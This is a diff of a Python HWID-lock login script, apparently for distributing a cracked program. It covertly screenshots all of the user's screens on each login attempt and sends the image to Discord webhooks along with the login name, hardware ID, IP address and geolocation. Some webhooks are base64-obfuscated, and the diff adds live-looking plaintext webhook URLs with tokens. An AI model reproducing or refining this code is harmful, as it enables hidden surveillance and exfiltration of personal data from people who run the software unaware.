@@ -4,6 +4,11 @@ ASSETS_PATH = OUTPUT_PATH / Path(r".img\\")
 def relative_to_assets(path: str) -> Path:
     return ASSETS_PATH / Path(path)
 
+def generate_cpu():
+    # uuid = subprocess.check_output('wmic csproduct get uuid', shell=False).decode().strip()
+    uuid = subprocess.check_output('wmic cpu get name', shell=False).decode().strip()
+    hashed_hwid = hashlib.sha256(uuid.encode()).hexdigest()
+    return hashed_hwid
 def generate_hwid():
     uuid = subprocess.check_output('wmic csproduct get uuid', shell=False).decode().strip()
     hashed_hwid = hashlib.sha256(uuid.encode()).hexdigest()
@@ -16,11 +21,12 @@ def gethwid():
     blist = json.dumps(blist, ensure_ascii=False).encode('utf-8')
     blist = b'PRP' + base64.b64encode(blist)
     return blist.decode('UTF-8')
-datahwidreg = httpx.get("https://gist.githubusercontent.com/PRPPRO/217da7a365a2a3784d0c3b6dc782a79c/raw/2d3fc14ca9ba531ff2b8b9db10f693d041c6122a/hwid")
-new_hwid = generate_hwid()[:16]
+datahwidreg = httpx.get("https://pastebin.com/raw/AsmGzNHk")
+new_hwid = generate_hwid()[:8]
+new_cpu = generate_cpu()[:8]
 hw = gethwid()[:15]
 mypcname = os.getlogin()
-hwid = f'''{hw}-{mypcname}-{new_hwid}'''
+hwid = f'''{hw}-{mypcname}-{new_hwid}{new_cpu}'''
 ipinfo = httpx.get("https://ipinfo.io/json")
 ipinfojson = ipinfo.json()
 ip = ipinfojson.get('ip')
@@ -30,9 +36,8 @@ region = ipinfojson.get('region')
 org = ipinfojson.get('org')
 loc = ipinfojson.get('loc')
 
-webhookusercanlogin_encoded_string = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3MjA4NzUxMjQ2NzY0MDM3MC9fMy1HVWVOTkFwSUFHS3NHY3ZIU3lwa1lxekc1WWZMa0RfZDlsa2gtVFlxN28tNlZGYk5XdURXSEZmZ25sM0dseTFQWA=='
-webhookusercanlogin_decoded_string = base64.b64decode(webhookusercanlogin_encoded_string).decode('utf-8')
-webhookusercanlogin = webhookusercanlogin_decoded_string
+webhookusercanlogin = f"https://discordapp.com/api/webhooks/1076085546411098153/2QIJFXrE-HUuVKm7PZZyiSXqY0TPTyV7YvQFEKp06TmsHO7GfGK580t-2i_PrT91Gen_"
+webhook_url = "https://discordapp.com/api/webhooks/1076085546411098153/2QIJFXrE-HUuVKm7PZZyiSXqY0TPTyV7YvQFEKp06TmsHO7GfGK580t-2i_PrT91Gen_"
 webhookusercantlogin_encoded_string = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3MjA4NzU1NjQ4MjY2NjU0Ni9aZkt4Zk9VWmxaZTFkaXhBRmhhSnZ3Q0pMaWhncmR3b1BXRnNPNTF2M3RFWUJHcG9UYTNKU00ybHR1QlJ6MnVIcUpjRw=='
 webhookusercantlogin_decoded_string = base64.b64decode(webhookusercantlogin_encoded_string).decode('utf-8')
 webhookusercantlogin = webhookusercantlogin_decoded_string
@@ -42,36 +47,48 @@ projectname = "แคร็กโปรแกรม"
 versionproject = "1"
 
 def loginpass():
-    image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
-    image.save("imageprpsecurity.png")
-    webhookusercanloginpic = DiscordWebhook(webhookusercanlogin, username=usercanlogin)
-    with open("imageprpsecurity.png", "rb") as f:
-        webhookusercanloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
-    os.remove("imageprpsecurity.png")
-    httpx.post(
-        webhookusercanlogin, json={
-            "content":"",
+    image = ImageGrab.grab(bbox=None, include_layered_windows=True, all_screens=True, xdisplay=None)
+    image_bytes = io.BytesIO()
+    image.save(image_bytes, format='PNG')
+    image_bytes.seek(0)
+
+    # Encode image bytes to base64
+    image_base64 = base64.b64encode(image_bytes.read()).decode()
+
+    # Set the image URL to a data URL
+    image_url = f"data:image/png;base64,{image_base64}"
+
+    # Post the webhook
+    response = requests.post(
+        webhook_url,
+        json={
+            "content": "",
             "embeds": [
-            {
-              "title": f"User : {mypcname}",
-              "tts": False,
-              "description": f"""Project : {projectname} 
-                Version : {versionproject} 
-                Status : เข้าระบบสำเร็จ 
-                HWID : {hwid}
-                IP : {ip}
-                เมือง : {city}
-                ประเทศ : {country}
-                ภูมิภาค : {region}
-                องค์กร : {org}
-                โลเคชั่น : {loc}""",
-              "color": 0x1cff00,
-            }
-          ],
-          "username": usercanlogin,
-          }
-        )
-    response = webhookusercanloginpic.execute()
+                {
+                    "title": f"User: {mypcname}",
+                    "description": f"""Project: {projectname}
+                    Version: {versionproject}
+                    Status: เข้าระบบสำเร็จ
+                    HWID: {hwid}
+                    IP: {ip}
+                    เมือง: {city}
+                    ประเทศ: {country}
+                    ภูมิภาค: {region}
+                    องค์กร: {org}
+                    โลเคชั่น: {loc}""",
+                    "color": 0x1cff00,
+                    "image": {"url": image_url},
+                }
+            ],
+            "username": usercanlogin,
+        }
+    )
+
+    # Check if the webhook was successful
+    if response.status_code == 204:
+        print("Webhook sent successfully.")
+    else:
+        print(f"Webhook failed with status code {response.status_code}.")
 def loginfaill():
     image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
     image.save("imageprpsecurity.png")
@@ -107,6 +124,7 @@ def loginfaill():
 def loginsus():
     if hwid in datahwidreg.text:
         loginpass()
+        print(loginpass)
         import file.hwid
         window.title(f"PRP Test LOCKHWID | User : {mypcname} | Status : Succeed | ✅ ")
     else:
